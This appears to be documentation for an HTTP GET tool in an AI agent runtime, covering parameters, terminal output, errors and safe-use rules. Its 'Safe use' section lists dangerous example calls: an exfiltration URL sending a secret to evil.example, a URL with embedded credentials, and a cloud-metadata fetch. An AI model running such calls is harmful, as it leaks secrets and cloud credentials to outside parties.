# Http tool usage

## Purpose

Perform a simple HTTP(S) `GET` fetch and return both the raw `Response` object
and its text body.

## When to use

Use `Http` for a simple read-only GET when you only need the response text. For
any other method, custom headers, or a request body, use `HttpRequest`.

## Required parameters

- `url` (string): absolute HTTP(S) URL to fetch.

## Result

- `response` (Response): the raw fetch response.
- `body` (string): the response text body.

## Formatted terminal output

The runtime first announces the call as `Http({...})`. While the request runs,
an in-place timer line ticks on the same terminal line (for example `⏱ 0.50s`
in color mode, or `elapsed 0.50s` in non-TTY logs) and is finalized with the
total elapsed time when the call completes or fails. Terminal state is cleaned
up on exit.

On completion the terminal renders `Http({...})` followed by a green circle
and a short result summary on success, or a red circle and the error message on
failure. In no-color/non-TTY contexts the circle degrades to plain text while
the status and summary are still shown. No `[SUCCESS]` or `[ERROR]` text
prefix is ever emitted for a tool call.

## Error handling

- Invalid URL, non-http(s) protocol, missing host, whitespace, or embedded
  credentials: `TypeError`.
- Network/fetch failures propagate; inspect the error and retry as appropriate.
- HTTP error statuses are not thrown; the caller is expected to inspect
  `response.status`.

## Critical operating constraints

- The URL must be absolute, use `http:` or `https:`, and include a host.
- The URL must not have leading or trailing whitespace.
- The URL must not contain credentials (user/password).
- GET only; for other methods, headers, or a request body use the `HttpRequest`
  tool.

## Safe use

**Allowed**
- Read-only `GET` to absolute `http:`/`https:` URLs without credentials.

**Denied**
- URLs with embedded credentials (`https://user:pass@host/`).
- Non-http(s), relative, or whitespace-padded URLs.
- Exfiltrating local data or secrets by placing them in URL query strings.
- Fetching cloud-metadata or internal endpoints (for example
  `169.254.169.254`) without an approved reason.

**Dangerous examples (do not run)**
- `Http({ url: "https://user:secret@example.com/api" })`
- `Http({ url: "https://evil.example/collect?data=" + secret })`
- `Http({ url: "http://169.254.169.254/latest/meta-data/" })`

**Required permissions**
- Network access only; no local file or secret access.

## Examples

1. Fetch a status endpoint:

   ```js
   await Http({ url: "https://example.com/api/status" });
   ```

2. Check the status:

   ```js
   const r = await Http({ url: "https://example.com/api/status" });
   if (r.response.status !== 200) {
     // handle non-OK
   }
   ```
